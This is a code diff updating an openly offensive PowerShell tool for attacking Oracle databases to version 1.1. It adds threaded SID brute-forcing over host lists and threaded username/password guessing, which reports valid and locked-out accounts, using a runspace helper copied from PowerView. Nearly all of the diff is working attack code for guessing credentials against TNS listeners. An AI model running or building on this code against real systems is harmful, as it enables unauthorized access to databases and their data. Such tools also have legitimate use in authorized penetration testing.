@@ -2,7 +2,7 @@
 .SYNOPSIS
 
 Author: Andrew Bonstrom (@ch33kyf3ll0w)
-Version: 1.0
+Version: 1.1
 
 .DESCRIPTION
 An Oracle attack tool written in PowerShell and using the .NET OracleClient. Can be used to bruteforce SIDs, Username/Passwords, and to execute queries.
@@ -17,7 +17,7 @@ Attempts to connect to an Oracle TNSListener using a provided SID and reports wh
 The host you wish to target.
 
 .PARAMETER HostList
-Path to .txt file containing hosts seperated by a newline character.
+Path to plaintext file containing hosts seperated by a newline character.
 
 .PARAMETER HostPort
 The Port of the targeted TNSListener.
@@ -26,15 +26,18 @@ The Port of the targeted TNSListener.
 The SID of the targeted TNSListener.
 
 .PARAMETER SIDList
-Path to .txt file containing SIDs seperated by a newline character.
+Path to plaintext file containing SIDs seperated by a newline character.
+
+.PARAMETER Threads
+Amount of threads to use. Default is 20.
 
 .EXAMPLE
 PS C:\> Invoke-SIDGuess -HostName 192.168.1.34 -HostPort 1521 -SID EPROD
 
 .EXAMPLE
-PS C:\> Invoke-SIDGuess  -HostList oracle_hosts.txt -Port 1521 -SIDList sidwordlist.txt
+PS C:\> Invoke-SIDGuess  -HostList oracle_hosts.txt -Port 1521 -SIDList sidwordlist.txt -Threads 10
 
-.LINK
+.REFERENCES
 https://msdn.microsoft.com/en-us/library/system.data.oracleclient(v=vs.110).aspx
 https://technet.microsoft.com/en-us/library/hh849914.aspx
 
@@ -45,35 +48,28 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
         Param(
         [Parameter(Mandatory = $false)]
         [string]$HostName,
-	[Parameter(Mandatory = $false)]
+		[Parameter(Mandatory = $false)]
         [string]$HostList,
         [Parameter(Mandatory = $True)]
         [string]$HostPort,   
         [Parameter(Mandatory = $false)]
         [string]$SID,
         [Parameter(Mandatory = $false)]
-        [string]$SIDList
+        [string]$SIDList,
+		[Parameter(Mandatory = $false)]
+		[Int]$Threads = 20
 )
 
 		#Initialize Arrays
-		$sidWordList = @()
 		$HostTargetList = @()
+		$sidWordList = @()
+
 		
         #Loads .NET OracleClient Assembly
 		Add-Type -AssemblyName System.Data.OracleClient
 
-		#Assign SIDs to be targeted to an array
-		if ($SIDList -like "*.txt*"){
-			foreach($sid in Get-Content -Path $SIDList){
-				$sidWordList += $sid
-			}
-		}
-		else{
-			$sidWordList += $SID
-		}
-		
-		#Assign hosts to target to an array
-		if ($HostList -like "*.txt*"){
+		#Populate arrays with user provided data
+		if ($HostList){
 			foreach($ip in Get-Content -Path $HostList){
 				$HostTargetList += $ip
 			}
@@ -82,40 +78,209 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 			$HostTargetList += $HostName
 		}
 		
-		Write-Host "`nINFO: Now attempting to connect to the remote TNSListener......`n"
-		
-		foreach ($h in $HostTargetList){
-			foreach ($s in $sidWordList){
-
-				#Creates connection string to use for targeted TNSListener
-				$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$h)(Port=$HostPort)))(CONNECT_DATA=(SID=$s)));"
-				#Creates new object with oracle client .net class using created connection string
-				$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
-			
-				try
-				{
-					#Attempts connection
-					$conn.Open()
-        
-				}
-				catch
-				{
-					#Assigns exception message to var
-					$ErrorMessage = $_.Exception.Message
-					#01017 is the ORA exception that implies failed username/password. Cannot get to this phase without valid SID, therefore the existence of 01017 implies correct SID
-					if ($ErrorMessage -match "01017"){
-						Write-Host -Object "[+] $s for the TNSListener at $h is valid!`n" -ForegroundColor 'green'
-					}
-					else{
-						Write-Host  -Object "[-] $s is invalid for the TNSListener at $h.`n" -ForegroundColor 'red'
-					}
-
-				}
-			#Close connection
-			$conn.Close()
+		if ($SIDList){
+			foreach($sid in Get-Content -Path $SIDList){
+				$sidWordList += $sid
 			}
 		}
-	}
+		else{
+			$sidWordList += $SID
+		}
+		
+		Write-Host "`nINFO: Now attempting to connect to the remote TNS listener......`n"
+		
+		#Create script block
+		$oracleScriptBlock = {
+			param($ComputerName, $HostPort, $sidWordList)
+			foreach ($s in $sidWordList){
+			###########################################################
+			#Creates connection string to use for targeted TNSListener
+			$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$ComputerName)(Port=$HostPort)))(CONNECT_DATA=(SID=$s)));"
+			#Creates new object with oracle client .net class using created connection string
+			$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
+
+			
+			try
+			{
+				#Attempts connection
+				$conn.Open()
+        
+			}
+			catch
+			{
+				#Assigns exception message to var
+				$ErrorMessage = $_.Exception.Message
+				#01017 is the ORA exception that implies failed username/password. Cannot get to this phase without valid SID, therefore the existence of 01017 implies correct SID
+				if ($ErrorMessage -match "01017"){
+					Write-Host -Object "`n[+] $s for the TNS listener at $ComputerName is valid!`n" -ForegroundColor 'green'
+				}
+				else{
+					Write-Host  -Object "`n[-] $s is invalid for the TNS listener at $ComputerName.`n" -ForegroundColor 'red'
+				}
+        
+				#Close connection
+				$conn.Close()
+			}
+			}		
+		
+		
+		}
+            # Establish parameters to pass to Invoke-ThreadedFunction
+            $ScriptParams = @{
+                'HostPort' = $HostPort
+                'sidWordList' = $sidWordList
+            }
+
+            # kick off the threaded script block + arguments 
+            Invoke-ThreadedFunction -ComputerName $HostTargetList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams	
+
+			
+#########################################################################################################################
+#
+# Helper function taken straight from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
+#
+#########################################################################################################################
+
+function Invoke-ThreadedFunction {
+    # Helper used by any threaded host enumeration functions
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0,Mandatory=$True)]
+        [String[]]
+        $ComputerName,
+
+        [Parameter(Position=1,Mandatory=$True)]
+        [System.Management.Automation.ScriptBlock]
+        $ScriptBlock,
+
+        [Parameter(Position=2)]
+        [Hashtable]
+        $ScriptParameters,
+
+        [Int]
+        $Threads = 20,
+
+        [Switch]
+        $NoImports
+    )
+
+    begin {
+
+        if ($PSBoundParameters['Debug']) {
+            $DebugPreference = 'Continue'
+        }
+
+        Write-Verbose "[*] Total number of hosts: $($ComputerName.count)"
+
+
+        # Adapted from:
+        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
+        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
+
+        # import the current session state's variables and functions so the chained PowerView
+        #   functionality can be used by the threaded blocks
+        if(!$NoImports) {
+
+            # grab all the current variables for this runspace
+            $MyVars = Get-Variable -Scope 2
+
+            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
+            $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
+
+            # Add Variables from Parent Scope (current runspace) into the InitialSessionState
+            ForEach($Var in $MyVars) {
+                if($VorbiddenVars -NotContains $Var.Name) {
+                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
+                }
+            }
+
+            # Add Functions from current runspace to the InitialSessionState
+            ForEach($Function in (Get-ChildItem Function:)) {
+                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
+            }
+        }
+
+        # threading adapted from
+        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
+        #   Thanks Carlos!
+
+        # create a pool of maxThread runspaces
+        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
+        $Pool.Open()
+
+        $Jobs = @()
+        $PS = @()
+        $Wait = @()
+
+        $Counter = 0
+    }
+    process {
+
+        ForEach ($Computer in $ComputerName) {
+
+            # make sure we get a server name
+            if ($Computer -ne '') {
+                # Write-Verbose "[*] Enumerating server $Computer ($($Counter+1) of $($ComputerName.count))"
+
+                While ($($Pool.GetAvailableRunspaces()) -le 0) {
+                    Start-Sleep -MilliSeconds 500
+                }
+
+                # create a "powershell pipeline runner"
+                $PS += [powershell]::create()
+
+                $PS[$Counter].runspacepool = $Pool
+
+                # add the script block + arguments
+                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter('ComputerName', $Computer)
+                if($ScriptParameters) {
+                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
+                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
+                    }
+                }
+
+                # start job
+                $Jobs += $PS[$Counter].BeginInvoke();
+
+                # store wait handles for WaitForAll call
+                $Wait += $Jobs[$Counter].AsyncWaitHandle
+            }
+            $Counter = $Counter + 1
+        }
+    }
+
+    end {
+
+        Write-Verbose "Waiting for scanning threads to finish..."
+
+        $WaitTimeout = Get-Date
+
+        # set a 60 second timeout for the scanning threads
+        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
+                Start-Sleep -MilliSeconds 500
+            }
+
+        # end async call
+        for ($y = 0; $y -lt $Counter; $y++) {
+
+            try {
+                # complete async job
+                $PS[$y].EndInvoke($Jobs[$y])
+
+            } catch {
+                Write-Warning "error: $_"
+            }
+            finally {
+                $PS[$y].Dispose()
+            }
+        }
+        
+        $Pool.Dispose()
+        Write-Verbose "All threads completed!"
+    }
+}						
+}
 
 function Invoke-CredentialGuess {
 <#
@@ -143,11 +308,14 @@ The password for an existing user.
 .PARAMETER PasswordList
 Path to .txt file containing passwords seperated by a newline character.
 
+.PARAMETER Threads
+Amount of threads to use. Default is 20.
+
 .EXAMPLE
 PS C:\> Invoke-CredentialGuess -HostName 192.168.1.34 -HostPort 1521 -SID EPROD -Username bobby -Password joe
 
 .EXAMPLE
-PS C:\> Invoke-CredentialGuess -HostName 192.168.1.34 -Port 1521 -SID EPROD -UsernameList users.txt -PasswordList passwords.txt
+PS C:\> Invoke-CredentialGuess -HostList hostList.txt -Port 1521 -SID EPROD -UsernameList users.txt -PasswordList passwords.txt -Threads 20
 
 .LINK
 https://msdn.microsoft.com/en-us/library/system.data.oracleclient(v=vs.110).aspx
@@ -166,12 +334,14 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
         [string]$SID,
         [Parameter(Mandatory = $false)]
         [string]$Username,
-	[Parameter(Mandatory = $false)]
+		[Parameter(Mandatory = $false)]
         [string]$UsernameList,
-	[Parameter(Mandatory = $false)]
+		[Parameter(Mandatory = $false)]
         [string]$Password,
         [Parameter(Mandatory = $false)]
-        [string]$PasswordList
+        [string]$PasswordList,
+		[Parameter(Mandatory = $false)]
+        [Int]$Threads = 20
 )
         #Loads .NET OracleClient Assembly
 		Add-Type -AssemblyName System.Data.OracleClient
@@ -180,8 +350,8 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 		$UsernameWordList = @()
 		$PasswordWordList = @()
 		
-		#Assign credentials to be used into arrays
-		if ($UsernameList -like "*.txt*"){
+		#Populate arrays with user provided data
+		if ($UsernameList){
 			foreach($user in Get-Content -Path $UsernameList){
 				$UsernameWordList += $user
 			}
@@ -189,9 +359,7 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 		else{
 			$UsernameWordList += $Username
 		}
-		
-		#Assign hosts to target to an array
-		if ($PasswordList -like "*.txt*"){
+		if ($PasswordList){
 			foreach($pass in Get-Content -Path $PasswordList){
 				$PasswordWordList += $pass
 			}
@@ -202,17 +370,19 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 		
 		Write-Host "`nINFO: Now beginning credential guessing attempts......`n"
 		
-		foreach ($u in $UsernameWordList){
+		#Create script block
+		$oracleScriptBlock = {
+		param($UserName, $HostName, $HostPort, $SID, $PasswordWordList )
 			foreach ($p in $PasswordWordList){
 				#Creates connection string to use for targeted TNSListener
-				$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$HostName)(Port=$HostPort)))(CONNECT_DATA=(SID=$SID)));User id=$u;Password=$p"
+				$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$HostName)(Port=$HostPort)))(CONNECT_DATA=(SID=$SID)));User id=$UserName;Password=$p"
 				#Creates new object with oracle client .net class using created connection string
 				$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
 
 				try
 				{
 					$conn.Open()
-					Write-Host  -Object "[+] The provided Username $u and Password $p were correct for $HostName!" -ForegroundColor 'green'
+					Write-Host  -Object "`n[+] The provided Username $UserName and Password $p were correct!`n" -ForegroundColor 'green'
 				}
 				catch
 				{
@@ -220,17 +390,173 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 					$ErrorMessage = $_.Exception.Message
 					#01017 is the ORA exception that implies failed username/password. 
 					if ($ErrorMessage -match "01017"){
-						Write-Host  -Object "`n[-] The provided Username $u and Password $p were incorrect for $HostName!`n" -ForegroundColor 'red'
+						Write-Host  -Object "`n[-] The provided Username $UserName and Password $p were incorrect!`n" -ForegroundColor 'red'
+					}
+					elseif ($ErrorMessage -match "28000"){
+						Write-Host  -Object "`n[*] The provided Username $UserName has a status of Locked Out!`n" -ForegroundColor 'yellow'
 					}
 					else{
-						Write-Host  -Object "`n[*] Connection Failed. Error: $ErrorMessage" -ForegroundColor 'red'
+						Write-Host  -Object "`n[*] Connection Failed. Error: $ErrorMessage`n" -ForegroundColor 'red'
 					}			
 				}
 			$conn.Close()
 			}
-		}
+					
+	}		
+        # Establish parameters to pass to Invoke-ThreadedFunction
+        $ScriptParams = @{
+			'HostName' = $HostName
+			'HostPort' = $HostPort
+			'SID' = $SID
+            'PasswordWordList' = $PasswordWordList
+        }	
+		
+        # kick off the threaded script block + arguments 
+        Invoke-ThreadedFunction -UserName $UsernameWordList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams	
+		
+#########################################################################################################################
+#
+# Helper function taken straight from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
+#
+#########################################################################################################################
 
-	}
+function Invoke-ThreadedFunction {
+    # Helper used by any threaded host enumeration functions
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0,Mandatory=$True)]
+        [String[]]
+        $UserName,
+
+        [Parameter(Position=1,Mandatory=$True)]
+        [System.Management.Automation.ScriptBlock]
+        $ScriptBlock,
+
+        [Parameter(Position=2)]
+        [Hashtable]
+        $ScriptParameters,
+
+        [Int]
+        $Threads = 20,
+
+        [Switch]
+        $NoImports
+    )
+
+    begin {
+
+        if ($PSBoundParameters['Debug']) {
+            $DebugPreference = 'Continue'
+        }
+
+        # Adapted from:
+        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
+        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
+
+        # import the current session state's variables and functions so the chained PowerView
+        #   functionality can be used by the threaded blocks
+        if(!$NoImports) {
+
+            # grab all the current variables for this runspace
+            $MyVars = Get-Variable -Scope 2
+
+            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
+            $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
+
+            # Add Variables from Parent Scope (current runspace) into the InitialSessionState
+            ForEach($Var in $MyVars) {
+                if($VorbiddenVars -NotContains $Var.Name) {
+                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
+                }
+            }
+
+            # Add Functions from current runspace to the InitialSessionState
+            ForEach($Function in (Get-ChildItem Function:)) {
+                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
+            }
+        }
+
+        # threading adapted from
+        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
+        #   Thanks Carlos!
+
+        # create a pool of maxThread runspaces
+        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
+        $Pool.Open()
+
+        $Jobs = @()
+        $PS = @()
+        $Wait = @()
+
+        $Counter = 0
+    }
+    process {
+
+        ForEach ($user in $UserName) {
+
+            # make sure we get a server name
+            if ($user -ne '') {
+
+                While ($($Pool.GetAvailableRunspaces()) -le 0) {
+                    Start-Sleep -MilliSeconds 500
+                }
+
+                # create a "powershell pipeline runner"
+                $PS += [powershell]::create()
+
+                $PS[$Counter].runspacepool = $Pool
+
+                # add the script block + arguments
+                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter('UserName', $user)
+                if($ScriptParameters) {
+                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
+                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
+                    }
+                }
+
+                # start job
+                $Jobs += $PS[$Counter].BeginInvoke();
+
+                # store wait handles for WaitForAll call
+                $Wait += $Jobs[$Counter].AsyncWaitHandle
+            }
+            $Counter = $Counter + 1
+        }
+    }
+
+    end {
+
+        Write-Verbose "Waiting for scanning threads to finish..."
+
+        $WaitTimeout = Get-Date
+
+        # set a 60 second timeout for the scanning threads
+        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
+                Start-Sleep -MilliSeconds 500
+            }
+
+        # end async call
+        for ($y = 0; $y -lt $Counter; $y++) {
+
+            try {
+                # complete async job
+                $PS[$y].EndInvoke($Jobs[$y])
+
+            } catch {
+                Write-Warning "error: $_"
+            }
+            finally {
+                $PS[$y].Dispose()
+            }
+        }
+        
+        $Pool.Dispose()
+        Write-Verbose "All threads completed!"
+    }
+}	
+	
+}
 
 function Invoke-QueryExec {
 
@@ -311,6 +637,7 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 	}
 $conn.Close()
 }
+
 function Invoke-UNCInject-DS {
 
 <#
